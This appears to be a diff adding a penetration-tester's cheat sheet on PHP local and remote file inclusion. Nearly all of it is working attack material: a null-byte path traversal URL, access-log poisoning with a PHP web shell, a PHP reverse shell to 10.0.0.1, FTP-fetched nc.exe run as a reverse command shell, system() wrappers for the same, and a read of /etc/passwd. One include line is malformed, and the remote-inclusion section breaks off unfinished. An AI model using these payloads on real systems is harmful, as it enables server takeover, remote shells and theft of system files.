@@ -1,0 +1,41 @@
+
+Local File Inclusion
+====================
+
+The %00 make php 5.3 and below ignore everything after that.
+
+Testing: http://192.168.1.1/addguestbook.php?name=dfjfgjhytry&comment=&LANG=en../../../../../windows/system32/drivers/etc/hosts%00
+...then let's add code to the access log :)
+~# nc 192.168.1.1 80
+<?php echo shell_exec($_GET['cmd']);?>
+...and use it
+http://192.168.1.1/addguestbook.php?name=dfjfgjhytry&comment=&cmd=ipconfig&LANG=en../../../../../../xampp/apache/logs/access.log%00
+...or php shell on linux:)
+<?php $s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");?>
+...finally send the requests to nc and exploit:
+
+# Windows FTP upload
+echo open 192.168.1.1 21 > ftp.txt && echo haxy>> ftp.txt && echo haxy >> ftp.txt && echo bin >> ftp.txt && echo GET nc.exe >> ftp.txt && echo bye >> ftp.txt && ftp -s:ftp.txt
+nc.exe -e cmd.exe 192.168.1.1  31337
+
+- - - - - - - -
+<? system('echo open 192.168.1.1 21 > ftp.txt'); ?>
+<? system('echo haxor >> ftp.txt'); ?>
+<? system('echo haxor >> ftp.txt'); ?>
+<? system('echo bin >> ftp.txt'); ?>
+<? system('echo GET nc.exe >> ftp.txt'); ?>
+<? system('echo bye >> ftp.txt'); ?>
+<? system('ftp -s:ftp.txt'); ?>
+<? system('nc.exe -e cmd.exe 192.168.1.1  31337'); ?>
+
+<?php phpinfo()?>
+<? system("cat /etc/passwd"); ?>
+<?php echo shell_exec($_GET["cmd"]);?>
+<?php include="124.1.1.1" ?>
+
+
+Remote file Inclusion
+=====================
+Example: http://192.168.1.1/add.php?name=asdasd&LANG=http://192.168.1.1/login.txt%00
+Note: the login.txt contains 
+
